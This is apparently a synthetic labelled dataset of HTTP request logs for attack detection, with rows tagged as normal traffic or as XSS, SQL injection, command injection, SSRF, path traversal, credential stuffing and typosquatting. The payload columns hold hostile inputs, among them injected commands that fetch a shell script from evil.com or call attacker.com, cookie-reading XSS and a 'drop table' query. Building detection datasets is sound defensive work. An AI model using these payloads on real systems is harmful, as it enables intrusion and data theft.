timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-16 01:11:47,185.199.108.48,172.67.128.45,https,post,/comment,"{""Host"":""10.0.0.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",comment=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,401,3392,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,<img src=x onerror=alert(1)>,xss,1,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-13 15:34:24,172.16.0.161,10.0.0.1,http,get,/search?q=alert('your session has expired'),"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,5502,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,alert('your session has expired'),xss,15,4,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-12 17:59:17,198.51.100.203,34.120.45.67,https,get,/search?q=<script>alert('xss')</script>,"{""Host"":""185.199.108.153"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,404,1530,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,<script>alert('xss')</script>,xss,17,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-06 04:50:53,10.0.0.117,10.0.0.1,http,get,/search?q=' and (select * from (select(master.dbo.fn_varbintohexstr(cast(db_name() as varbinary))))a)--,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,7602,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,' and (select * from (select(master.dbo.fn_varbintohexstr(cast(db_name() as varbinary))))a)--,sql_injection,4,4,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-13 05:26:46,104.18.24.112,185.199.108.153,http,get,/settings,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,3625,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,5,4,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx
2026-03-06 08:04:22,172.16.0.122,185.199.108.153,http,get,/search?q=<svg onload=alert(document.cookie)>,"{""Host"":""172.67.128.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,200,3014,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,<svg onload=alert(document.cookie)>,xss,8,4,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-03 15:45:36,172.16.0.219,203.0.113.45,http,get,/ping?ip=127.0.0.1; wget http://evil.com/shell.sh,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,3370,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,; wget http://evil.com/shell.sh,command_injection,15,1,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-01 00:29:39,172.16.0.29,198.51.100.23,https,post,/search,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,200,2177,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,0,6,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-19 09:20:00,192.168.1.65,203.0.113.45,http,get,/ping?ip=127.0.0.1&& timeout 5,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,401,1814,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,&& timeout 5,command_injection,9,3,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,XSStrike/3.1.5,*/*,text/html,nginx
2026-03-07 22:52:35,10.0.0.183,52.45.123.89,https,get,/login?user=' union all select table_name from information_schema.tables--,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,4402,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,' union all select table_name from information_schema.tables--,sql_injection,22,5,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-22 01:02:11,198.51.100.113,198.51.100.23,http,get,https://yaho0.com/login,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,810,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,yaho0.com,typosquatting_url_spoofing,1,6,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-06 01:22:08,10.0.0.124,203.0.113.45,http,post,/products,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=john_doe&password=pass123,200,3099,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,1,4,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare
2026-03-17 01:45:42,10.0.0.88,185.199.108.153,https,get,/api/v1/products?sort=2,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,4479,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,1,1,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Cloudflare
2026-03-12 23:25:20,185.199.108.164,104.18.24.12,https,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=root&password=password123,401,1138,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,username=root&password=password123,credential_stuffing_brute_force,23,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-14 11:10:33,198.51.100.176,192.168.1.1,http,post,/login,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=bob&password=Spring2024,500,7556,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,username=bob&password=spring2024,credential_stuffing_brute_force,11,5,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-07 07:01:11,192.168.1.85,10.0.0.1,https,get,/proxy?target=http://attacker.com/callback,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,4780,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,http://attacker.com/callback,ssrf,7,5,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-04 23:24:32,172.67.128.213,3.12.45.78,http,get,https://wwwlinkedincom/login?redirect=/dashboard,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,7682,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,wwwlinkedincom,typosquatting_url_spoofing,23,2,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-05 02:47:00,192.168.1.143,172.67.128.45,https,post,/api/v1/users,"{""Host"":""203.0.113.45"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",comment=Great article!,200,3413,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",wget/1.21.2,,normal,2,3,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",203.0.113.45,wget/1.21.2,*/*,text/html,Cloudflare
2026-03-12 12:23:18,198.51.100.54,198.51.100.23,http,post,/comment,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22,500,7043,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,"<img src=""x"" onerror=""alert(1)""",xss,12,3,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-02 16:05:14,172.16.0.212,34.120.45.67,http,get,/proxy?target=dict://localhost:11211,"{""Host"":""203.0.113.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,2121,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,dict://localhost:11211/,ssrf,16,0,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,Nikto/2.5.0,*/*,text/html,Apache
2026-03-15 11:21:38,10.0.0.142,104.18.24.12,http,get,/view?path=../../../../var/log/apache/access.log,"{""Host"":""52.45.123.89"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,401,7983,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,../../../../var/log/apache/access.log,directory_traversal,11,6,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Nikto/2.5.0,*/*,text/html,Apache
2026-03-24 23:24:23,185.199.108.142,104.18.24.12,https,get,/search?q=' union all select table_name from information_schema.tables--,"{""Host"":""10.0.0.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,500,1732,"{""Content-Type"":""text/html"",""Server"":""IIS""}",SQLmap/1.8.4,' union all select table_name from information_schema.tables--,sql_injection,23,1,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,SQLmap/1.8.4,*/*,text/html,IIS
2026-03-17 16:31:48,192.168.1.1,34.120.45.67,http,get,/ping?ip=127.0.0.1&& curl http://attacker.com,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,6623,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,&& curl http://attacker.com,command_injection,16,1,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-05 11:40:20,10.0.0.206,198.51.100.23,http,get,/api/v1/products,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,3823,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,11,3,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Cloudflare
2026-03-02 14:54:00,10.0.0.50,10.0.0.1,http,post,/login,"{""Host"":""192.168.1.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",email=test5@test.com&password=password,302,4090,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,email=test5@test.com&password=password,credential_stuffing_brute_force,14,0,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-07 02:43:40,185.199.108.38,3.12.45.78,http,get,/search?q=#<img src=/ onerror=alert(1)>,"{""Host"":""3.12.45.78"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,500,1369,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nmap Scripting Engine,#<img src=/ onerror=alert(1)>,xss,2,5,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,Nmap Scripting Engine,*/*,text/html,IIS
2026-03-04 14:48:43,10.0.0.202,198.51.100.23,https,get,https://micros0ft.com/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,6911,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,micros0ft.com,typosquatting_url_spoofing,14,2,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-17 17:48:30,10.0.0.98,198.51.100.23,https,get,/home,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,661,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,17,1,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",34.120.45.67,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-06 00:46:10,172.16.0.187,172.67.128.45,https,post,/js/script.js?limit=1,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",name=John&message=Hello,200,4669,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,0,4,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-22 04:40:15,10.0.0.244,3.12.45.78,https,get,/search?q='; drop table users--,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,4203,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,'; drop table users--,sql_injection,4,6,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-14 00:05:29,192.168.1.46,192.168.1.1,http,get,https://paypal-login-verification.com/login,"{""Host"":""34.120.45.67"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,302,3964,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,paypal-login-verification.com,typosquatting_url_spoofing,0,5,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,BurpSuite/2023.12,*/*,text/html,Apache
2026-03-04 04:39:37,10.0.0.53,104.18.24.12,http,get,/ping?ip=127.0.0.1-e /bin/bash,"{""Host"":""185.199.108.153"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,401,3773,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,-e /bin/bash,command_injection,4,2,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Nikto/2.5.0,*/*,text/html,Apache
2026-03-08 17:08:36,172.16.0.247,172.67.128.45,https,get,/fetch?url=http://192.168.1.1/config,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,4232,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,http://192.168.1.1/config,ssrf,17,6,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-13 14:59:15,172.16.0.186,172.67.128.45,http,get,/search?category=laptop,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,4290,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,14,4,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Cloudflare
2026-03-20 04:02:10,198.51.100.128,34.120.45.67,http,get,/proxy?target=http://burp-collaborator.net,"{""Host"":""192.168.1.1"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,404,6997,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,http://burp-collaborator.net,ssrf,4,4,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Nikto/2.5.0,*/*,text/html,IIS
